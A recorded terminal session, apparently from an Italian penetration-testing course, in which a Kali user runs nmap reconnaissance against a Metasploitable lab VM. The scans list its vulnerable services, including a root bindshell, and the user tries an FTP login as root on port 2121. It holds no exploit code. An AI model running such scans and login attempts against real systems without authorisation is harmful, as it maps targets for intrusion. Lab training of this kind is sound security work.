@@ -1,0 +1,1161 @@
+Script started on 2019-11-26 05:52:32-05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="129" LINES="39"]
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ping 192.168.58.129
+PING 192.168.58.129 (192.168.58.129) 56(84) bytes of data.
+64 bytes from 192.168.58.129: icmp_seq=1 ttl=64 time=0.753 ms
+64 bytes from 192.168.58.129: icmp_seq=2 ttl=64 time=0.516 ms
+^C
+--- 192.168.58.129 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1024ms
+rtt min/avg/max/mdev = 0.516/0.634/0.753/0.118 ms
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -v -p 200 192.168.58.129
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 05:57 EST
+Initiating ARP Ping Scan at 05:57
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 05:57, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:57
+Completed Parallel DNS resolution of 1 host. at 05:57, 0.01s elapsed
+Initiating SYN Stealth Scan at 05:57
+Scanning 192.168.58.129 [1 port]
+Completed SYN Stealth Scan at 05:57, 0.04s elapsed (1 total ports)
+Nmap scan report for 192.168.58.129
+Host is up (0.00029s latency).
+
+PORT    STATE  SERVICE
+200/tcp closed src
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
+           Raw packets sent: 2 (72B) | Rcvd: 2 (68B)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -v -p 200 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.1290 192.168.58.129- 192.168.58.1296 192.168.58.1295 192.168.58.1293 192.168.58.1295 192.168.58.129[1@5
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 05:57 EST
+Initiating ARP Ping Scan at 05:57
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 05:57, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:57
+Completed Parallel DNS resolution of 1 host. at 05:57, 0.00s elapsed
+Initiating SYN Stealth Scan at 05:57
+Scanning 192.168.58.129 [65536 ports]
+Discovered open port 25/tcp on 192.168.58.129
+Discovered open port 21/tcp on 192.168.58.129
+Discovered open port 445/tcp on 192.168.58.129
+Discovered open port 53/tcp on 192.168.58.129
+Discovered open port 111/tcp on 192.168.58.129
+Discovered open port 3306/tcp on 192.168.58.129
+Discovered open port 139/tcp on 192.168.58.129
+Discovered open port 5900/tcp on 192.168.58.129
+Discovered open port 23/tcp on 192.168.58.129
+Discovered open port 3632/tcp on 192.168.58.129
+Discovered open port 32790/tcp on 192.168.58.129
+Discovered open port 37685/tcp on 192.168.58.129
+Discovered open port 514/tcp on 192.168.58.129
+Discovered open port 56949/tcp on 192.168.58.129
+Discovered open port 8180/tcp on 192.168.58.129
+Discovered open port 6000/tcp on 192.168.58.129
+Discovered open port 8009/tcp on 192.168.58.129
+Discovered open port 6667/tcp on 192.168.58.129
+Discovered open port 2121/tcp on 192.168.58.129
+Discovered open port 50950/tcp on 192.168.58.129
+Discovered open port 81/tcp on 192.168.58.129
+Discovered open port 2049/tcp on 192.168.58.129
+Discovered open port 513/tcp on 192.168.58.129
+Discovered open port 8787/tcp on 192.168.58.129
+Discovered open port 5432/tcp on 192.168.58.129
+Discovered open port 1524/tcp on 192.168.58.129
+Discovered open port 1099/tcp on 192.168.58.129
+Discovered open port 512/tcp on 192.168.58.129
+Discovered open port 6697/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 05:58, 5.29s elapsed (65536 total ports)
+Nmap scan report for 192.168.58.129
+Host is up (0.0024s latency).
+Not shown: 65507 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+23/tcp    open  telnet
+25/tcp    open  smtp
+53/tcp    open  domain
+81/tcp    open  hosts2-ns
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+512/tcp   open  exec
+513/tcp   open  login
+514/tcp   open  shell
+1099/tcp  open  rmiregistry
+1524/tcp  open  ingreslock
+2049/tcp  open  nfs
+2121/tcp  open  ccproxy-ftp
+3306/tcp  open  mysql
+3632/tcp  open  distccd
+5432/tcp  open  postgresql
+5900/tcp  open  vnc
+6000/tcp  open  X11
+6667/tcp  open  irc
+6697/tcp  open  ircs-u
+8009/tcp  open  ajp13
+8180/tcp  open  unknown
+8787/tcp  open  msgsrvr
+32790/tcp open  unknown
+37685/tcp open  unknown
+50950/tcp open  unknown
+56949/tcp open  unknown
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 5.52 seconds
+           Raw packets sent: 65537 (2.884MB) | Rcvd: 65537 (2.622MB)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# namp [K[K[K[Kmap -A -t 4 [K[K[K[K[K[K[K[K[K[K[K[K[Kifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.58.128  netmask 255.255.255.0  broadcast 192.168.58.255
+        inet6 fe80::20c:29ff:fe2c:f8ad  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:2c:f8:ad  txqueuelen 1000  (Ethernet)
+        RX packets 69346  bytes 6680907 (6.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 68258  bytes 4254557 (4.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 40  bytes 2116 (2.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 40  bytes 2116 (2.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -A -t 4 [K[K[K[K[K-t 5 192.168.58.128 [C[C[C[1@ [1@-[1@p[C[1@ [1@0[1@-[1@6[1@5[1@5[1@3[1@5
+nmap: option '-t' is ambiguous; possibilities: '-timing' '-thc' '-ttl' '-traceroute' '-top-ports'
+See the output of nmap -h for a summary of options.
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -A -t 5 -p 0-65535 192.168.58.128 [1P[1@T
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:02 EST
+Nmap scan report for 192.168.58.128
+Host is up (0.000033s latency).
+Not shown: 65535 closed ports
+PORT    STATE SERVICE VERSION
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -A -T 5 -p 0-65535 192.168.58.128 t[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cifconfig[Knmap -v -p 0-65535 192.168.58.129[C[1P[1P[1@-[1@T[C[1@ [1@5
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:03 EST
+Nmap scan report for 192.168.58.129
+Host is up (0.0026s latency).
+Not shown: 65507 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+23/tcp    open  telnet
+25/tcp    open  smtp
+53/tcp    open  domain
+81/tcp    open  hosts2-ns
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+512/tcp   open  exec
+513/tcp   open  login
+514/tcp   open  shell
+1099/tcp  open  rmiregistry
+1524/tcp  open  ingreslock
+2049/tcp  open  nfs
+2121/tcp  open  ccproxy-ftp
+3306/tcp  open  mysql
+3632/tcp  open  distccd
+5432/tcp  open  postgresql
+5900/tcp  open  vnc
+6000/tcp  open  X11
+6667/tcp  open  irc
+6697/tcp  open  ircs-u
+8009/tcp  open  ajp13
+8180/tcp  open  unknown
+8787/tcp  open  msgsrvr
+32790/tcp open  unknown
+37685/tcp open  unknown
+50950/tcp open  unknown
+56949/tcp open  unknown
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# adduser at[Krturopesaro[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kuseradd arturo.[Kpesaro
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# su arturopesaro
+$ 
+$ 
+$ 
+$ whoami
+arturopesaro
+$ 
+$ namp   map -T 5 -p 0-65535 192.168.58.128^[[D^[[D^[[D^[[D                                              -A -T 5      -T 5 -p 0-65535 192.168.58.128
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:06 EST
+Nmap scan report for 192.168.58.128
+Host is up (0.000091s latency).
+Not shown: 65535 closed ports
+PORT    STATE SERVICE VERSION
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds
+$ 
+$ 
+$ 
+$ sudo su
+
+Questa lezione dovrebbe essere stata impartita dall'amministratore
+di sistema locale. Solitamente equivale a:
+
+    #1) Rispettare la privacy degli altri
+    #2) Pensare prima di digitare
+    #3) Da grandi poteri derivano grandi responsabilità
+
+[sudo] password di arturopesaro: 
+$ 
+$ 
+$ 
+$ 
+$ sudo su -
+
+Questa lezione dovrebbe essere stata impartita dall'amministratore
+di sistema locale. Solitamente equivale a:
+
+    #1) Rispettare la privacy degli altri
+    #2) Pensare prima di digitare
+    #3) Da grandi poteri derivano grandi responsabilità
+
+[sudo] password di arturopesaro: 
+Riprovare.
+[sudo] password di arturopesaro: 
+
+
+^C
+
+
+^Csudo: 2 tentativi di immissione password non corretti
+$ ^C
+$ 
+$ 
+$ sudo su root
+
+Questa lezione dovrebbe essere stata impartita dall'amministratore
+di sistema locale. Solitamente equivale a:
+
+    #1) Rispettare la privacy degli altri
+    #2) Pensare prima di digitare
+    #3) Da grandi poteri derivano grandi responsabilità
+
+[sudo] password di arturopesaro: 
+Riprovare.
+[sudo] password di arturopesaro: 
+sudo: 1 tentativo di immissione password non corretto
+$ 
+$ 
+$ 
+$ 
+$ 
+$ 
+$ exit
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# [K]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nann[K[K[K[K[K]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -sU -p 0-65535 192.168.58.129[C[C[C[C[C[C[C 192.168.58.129- 192.168.58.129v 192.168.58.129
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:13 EST
+Initiating ARP Ping Scan at 06:13
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:13, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:13
+Completed Parallel DNS resolution of 1 host. at 06:13, 0.00s elapsed
+Initiating UDP Scan at 06:13
+Scanning 192.168.58.129 [65536 ports]
+Increasing send delay for 192.168.58.129 from 0 to 50 due to max_successful_tryno increase to 4
+Increasing send delay for 192.168.58.129 from 50 to 100 due to max_successful_tryno increase to 5
+Increasing send delay for 192.168.58.129 from 100 to 200 due to max_successful_tryno increase to 6
+Increasing send delay for 192.168.58.129 from 200 to 400 due to max_successful_tryno increase to 7
+Increasing send delay for 192.168.58.129 from 400 to 800 due to max_successful_tryno increase to 8
+Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 0.19% done
+UDP Scan Timing: About 0.30% done
+UDP Scan Timing: About 0.35% done
+UDP Scan Timing: About 0.39% done
+UDP Scan Timing: About 0.43% done
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -sU -p 0-65535 -v 192.168.58.129[C[1P[1P[1P[1P[1P[1@5[1@0[1@0[1@0
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:18 EST
+Initiating ARP Ping Scan at 06:18
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:18, 0.03s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:18
+Completed Parallel DNS resolution of 1 host. at 06:18, 0.00s elapsed
+Initiating UDP Scan at 06:18
+Scanning 192.168.58.129 [5001 ports]
+Increasing send delay for 192.168.58.129 from 0 to 50 due to max_successful_tryno increase to 4
+Increasing send delay for 192.168.58.129 from 50 to 100 due to max_successful_tryno increase to 5
+Increasing send delay for 192.168.58.129 from 100 to 200 due to max_successful_tryno increase to 6
+Increasing send delay for 192.168.58.129 from 200 to 400 due to max_successful_tryno increase to 7
+Increasing send delay for 192.168.58.129 from 400 to 800 due to max_successful_tryno increase to 8
+UDP Scan Timing: About 0.89% done
+UDP Scan Timing: About 1.43% done; ETC: 07:29 (1:10:06 remaining)
+UDP Scan Timing: About 1.97% done; ETC: 07:35 (1:15:39 remaining)
+Discovered open port 53/udp on 192.168.58.129
+UDP Scan Timing: About 3.70% done; ETC: 07:41 (1:19:55 remaining)
+UDP Scan Timing: About 13.36% done; ETC: 07:45 (1:15:41 remaining)
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# Nmap -p 1-1024 -sC -v -n -O -Pn 192.168.58.129[1P[1@n
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:32 EST
+NSE: Loaded 121 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:32
+Completed NSE at 06:32, 0.00s elapsed
+Initiating NSE at 06:32
+Completed NSE at 06:32, 0.00s elapsed
+Initiating ARP Ping Scan at 06:32
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:32, 0.03s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 06:32
+Scanning 192.168.58.129 [1024 ports]
+Discovered open port 21/tcp on 192.168.58.129
+Discovered open port 23/tcp on 192.168.58.129
+Discovered open port 111/tcp on 192.168.58.129
+Discovered open port 445/tcp on 192.168.58.129
+Discovered open port 25/tcp on 192.168.58.129
+Discovered open port 139/tcp on 192.168.58.129
+Discovered open port 53/tcp on 192.168.58.129
+Discovered open port 81/tcp on 192.168.58.129
+Discovered open port 512/tcp on 192.168.58.129
+Discovered open port 514/tcp on 192.168.58.129
+Discovered open port 513/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 06:32, 0.14s elapsed (1024 total ports)
+Initiating OS detection (try #1) against 192.168.58.129
+NSE: Script scanning 192.168.58.129.
+Initiating NSE at 06:32
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 06:33, 50.34s elapsed
+Initiating NSE at 06:33
+Completed NSE at 06:33, 0.00s elapsed
+Nmap scan report for 192.168.58.129
+Host is up (0.00069s latency).
+Not shown: 1013 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.58.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+23/tcp  open  telnet
+25/tcp  open  smtp
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+|_ssl-date: 2019-11-26T11:32:22+00:00; -35s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_WITH_MD5
+53/tcp  open  domain
+| dns-nsid: 
+|_  bind.version: 9.4.2
+81/tcp  open  hosts2-ns
+111/tcp open  rpcbind
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+512/tcp open  exec
+513/tcp open  login
+514/tcp open  shell
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 0.032 days (since Tue Nov 26 05:47:00 2019)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=201 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+Host script results:
+|_clock-skew: -35s
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   METASPLOITABLE<00>   Flags: <unique><active>
+|   METASPLOITABLE<03>   Flags: <unique><active>
+|   METASPLOITABLE<20>   Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:33
+Completed NSE at 06:33, 0.00s elapsed
+Initiating NSE at 06:33
+Completed NSE at 06:33, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.48 seconds
+           Raw packets sent: 1044 (46.682KB) | Rcvd: 1040 (42.342KB)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# namp map -p 1-1024 -sC -v -n -O -Pn 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P 192.168.58.129[1P192.168.58.129[C 192.168.58.1290 192.168.58.129- 192.168.58.1292 192.168.58.1290 192.168.58.1290 192.168.58.1290 192.168.58.129[C 192.168.58.129- 192.168.58.129v 192.168.58.129[C 192.168.58.129- 192.168.58.129P 192.168.58.129n 192.168.58.129[C 192.168.58.129- 192.168.58.129s 192.168.58.129V 192.168.58.129[C 192.168.58.129
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:38 EST
+NSE: Loaded 45 scripts for scanning.
+Initiating ARP Ping Scan at 06:38
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:38, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:38
+Completed Parallel DNS resolution of 1 host. at 06:38, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:38
+Scanning 192.168.58.129 [2001 ports]
+Discovered open port 139/tcp on 192.168.58.129
+Discovered open port 111/tcp on 192.168.58.129
+Discovered open port 25/tcp on 192.168.58.129
+Discovered open port 53/tcp on 192.168.58.129
+Discovered open port 445/tcp on 192.168.58.129
+Discovered open port 23/tcp on 192.168.58.129
+Discovered open port 21/tcp on 192.168.58.129
+Discovered open port 514/tcp on 192.168.58.129
+Discovered open port 1099/tcp on 192.168.58.129
+Discovered open port 512/tcp on 192.168.58.129
+Discovered open port 81/tcp on 192.168.58.129
+Discovered open port 513/tcp on 192.168.58.129
+Discovered open port 1524/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 06:38, 0.22s elapsed (2001 total ports)
+Initiating Service scan at 06:38
+Scanning 13 services on 192.168.58.129
+Completed Service scan at 06:38, 11.02s elapsed (13 services on 1 host)
+NSE: Script scanning 192.168.58.129.
+Initiating NSE at 06:38
+Completed NSE at 06:38, 0.05s elapsed
+Initiating NSE at 06:38
+Completed NSE at 06:38, 0.03s elapsed
+Nmap scan report for 192.168.58.129
+Host is up (0.0027s latency).
+Not shown: 1988 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+81/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
+           Raw packets sent: 2002 (88.072KB) | Rcvd: 2002 (80.120KB)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -p 0-2000 -v -Pn -sV  192.168.58.129[1P[1@-[1@t[1@o[1@p[1@-[1@p[1@o[1@r[1@t[1@s[C[C[C[C[1P[1P
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:39 EST
+NSE: Loaded 45 scripts for scanning.
+Initiating ARP Ping Scan at 06:39
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:39, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:39
+Completed Parallel DNS resolution of 1 host. at 06:39, 0.01s elapsed
+Initiating SYN Stealth Scan at 06:39
+Scanning 192.168.58.129 [2000 ports]
+Discovered open port 139/tcp on 192.168.58.129
+Discovered open port 21/tcp on 192.168.58.129
+Discovered open port 111/tcp on 192.168.58.129
+Discovered open port 25/tcp on 192.168.58.129
+Discovered open port 3306/tcp on 192.168.58.129
+Discovered open port 5900/tcp on 192.168.58.129
+Discovered open port 23/tcp on 192.168.58.129
+Discovered open port 445/tcp on 192.168.58.129
+Discovered open port 53/tcp on 192.168.58.129
+Discovered open port 81/tcp on 192.168.58.129
+Discovered open port 513/tcp on 192.168.58.129
+Discovered open port 6000/tcp on 192.168.58.129
+Discovered open port 2049/tcp on 192.168.58.129
+Discovered open port 3632/tcp on 192.168.58.129
+Discovered open port 2121/tcp on 192.168.58.129
+Discovered open port 1524/tcp on 192.168.58.129
+Discovered open port 6667/tcp on 192.168.58.129
+Discovered open port 8009/tcp on 192.168.58.129
+Discovered open port 8180/tcp on 192.168.58.129
+Discovered open port 1099/tcp on 192.168.58.129
+Discovered open port 514/tcp on 192.168.58.129
+Discovered open port 512/tcp on 192.168.58.129
+Discovered open port 5432/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 06:39, 0.23s elapsed (2000 total ports)
+Initiating Service scan at 06:39
+Scanning 23 services on 192.168.58.129
+Completed Service scan at 06:40, 11.05s elapsed (23 services on 1 host)
+NSE: Script scanning 192.168.58.129.
+Initiating NSE at 06:40
+Completed NSE at 06:40, 0.16s elapsed
+Initiating NSE at 06:40
+NSOCK ERROR [11.9010s] mksock_bind_addr(): Bind to 0.0.0.0:111 failed (IOD #17): Address already in use (98)
+Completed NSE at 06:40, 0.05s elapsed
+Nmap scan report for 192.168.58.129
+Host is up (0.0026s latency).
+Not shown: 1977 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+81/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+           Raw packets sent: 2001 (88.028KB) | Rcvd: 2001 (80.120KB)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ftc[Kp 2121
+ftp: connect: Invalid argument
+ftp> 
+ftp> ^C
+ftp> ^C
+ftp> ^C
+ftp> ^C
+ftp> 
+ftp> ex[K[Kbye
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ftp 192.168.58.129 2121
+Connected to 192.168.58.129.
+220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.58.129]
+Name (192.168.58.129:root): root
+331 Password required for root
+Password:
+530 Login incorrect.
+Login failed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+ftp> 
+ftp> 
+ftp> 
+ftp> ls
+530 Please login with USER and PASS
+ftp: bind: Address already in use
+ftp> bye
+221 Goodbye.
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ftp 192.168.58.129 2121
